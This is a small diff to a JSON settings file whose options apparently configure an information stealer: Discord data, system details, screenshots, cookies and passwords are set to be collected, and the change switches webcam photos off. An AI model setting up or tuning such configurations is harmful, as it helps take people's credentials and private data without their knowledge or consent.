@@ -3,7 +3,7 @@
     "os_info": true,
     "system_info": true,
     "discord_info": true,
-    "webcam_photo": true,
+    "webcam_photo": false,
     "screenshot": true,
     "cookies": true,
     "password": true,
